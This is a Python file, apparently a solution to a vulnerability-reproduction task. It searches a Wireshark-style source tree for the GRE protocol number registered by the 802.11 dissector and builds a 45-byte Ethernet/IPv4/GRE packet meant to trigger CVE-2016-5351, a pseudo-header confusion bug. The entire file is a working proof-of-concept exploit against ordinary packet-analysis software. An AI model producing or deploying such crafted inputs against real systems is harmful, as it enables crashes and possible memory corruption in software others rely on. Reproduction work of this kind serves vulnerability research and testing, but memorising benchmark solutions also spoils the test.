import struct
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default fallback protocol value for 802.11 in GRE (GRE_WLAN)
        # 0x5e00 is the value associated with CVE-2016-5351
        target_proto = 0x5e00
        found_proto = False
        proto_name = None

        # 1. Analyze source code to find the exact GRE protocol value
        # Look for dissector_add_uint("gre.proto", VALUE, ...) in packet-ieee80211.c
        for root, dirs, files in os.walk(src_path):
            if found_proto: break
            for name in files:
                if name == "packet-ieee80211.c":
                    try:
                        path = os.path.join(root, name)
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            # Search for registration
                            m = re.search(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+|\d+)\s*,', content)
                            if m:
                                val = m.group(1)
                                if val.startswith("0x") or val.isdigit():
                                    target_proto = int(val, 0)
                                    found_proto = True
                                else:
                                    proto_name = val
                    except:
                        pass
                if found_proto: break
        
        # 2. If a macro name was found (e.g., GRE_WLAN), resolve its value from headers
        if not found_proto and proto_name:
            for root, dirs, files in os.walk(src_path):
                if found_proto: break
                for name in files:
                    if name.endswith(".h") or name.endswith(".c"):
                        try:
                            path = os.path.join(root, name)
                            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                # Search for definition: #define NAME VALUE
                                m = re.search(r'#define\s+' + re.escape(proto_name) + r'\s+(0x[0-9a-fA-F]+|\d+)', content)
                                if m:
                                    target_proto = int(m.group(1), 0)
                                    found_proto = True
                                    break
                        except:
                            pass

        # 3. Construct the PoC packet
        # Total length target: 45 bytes
        # Structure: Eth (14) + IP (20) + GRE (4) + Payload (7)
        
        # Ethernet Header (14 bytes)
        eth_dst = b'\xff\xff\xff\xff\xff\xff'
        eth_src = b'\x00\x00\x00\x00\x00\x00'
        eth_type = struct.pack('!H', 0x0800) # IPv4
        eth = eth_dst + eth_src + eth_type

        # IP Header (20 bytes)
        ip_ver = 0x45
        ip_tos = 0
        ip_len = 31 # 45 - 14
        ip_id = 0
        ip_frag = 0
        ip_ttl = 64
        ip_proto = 47 # GRE
        ip_check = 0
        ip_src = b'\x7f\x00\x00\x01'
        ip_dst = b'\x7f\x00\x00\x01'
        
        # Calculate IP Checksum
        ip_header_raw = struct.pack('!BBHHHBBH4s4s', 
            ip_ver, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, 0, ip_src, ip_dst)
        
        s = 0
        for i in range(0, len(ip_header_raw), 2):
            w = (ip_header_raw[i] << 8) + ip_header_raw[i+1]
            s += w
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        ip_check = ~s & 0xFFFF
        
        ip = struct.pack('!BBHHHBBH4s4s', 
            ip_ver, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_src, ip_dst)

        # GRE Header (4 bytes)
        # Flags/Ver = 0, Protocol = target_proto
        gre = struct.pack('!HH', 0, target_proto)

        # Payload (7 bytes)
        # Just enough data to trigger the dissector call, content will be misinterpreted
        # due to the vulnerability (pseudo-header confusion)
        payload = b'\x00' * 7
        
        return eth + ip + gre + payload